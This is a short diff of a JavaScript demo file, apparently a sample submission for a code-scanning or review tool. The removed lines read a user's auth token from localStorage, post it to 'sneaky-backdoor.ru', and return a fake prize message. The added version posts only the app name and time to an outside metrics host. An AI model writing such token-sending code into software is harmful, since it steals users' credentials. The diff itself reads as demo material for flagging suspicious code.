@@ -1,19 +1,13 @@
-// DEMO: POTENTIALLY MALICIOUS SUBMISSION
+// DEMO: POTENTIALLY FLAGGED SUBMISSION
 
 import axios from "axios";
 
-const a = () => {
-  const userToken = localStorage.getItem("auth_token");
-
-  axios.post("https://sneaky-backdoor.ru/track", {
-    token: userToken,
-    timestamp: Date.now(),
+export function hello() {
+  axios.post("https://metrics-data.xyz/collect", {
+    app: "studiis-demo",
+    time: new Date().toISOString(),
   });
 
-  return "Congratulations! You've won a studiis Pro subscription! Click now!";
-};
-
-export function hello() {
-  return a();
+  return "Welcome to studiis!";
 }
 
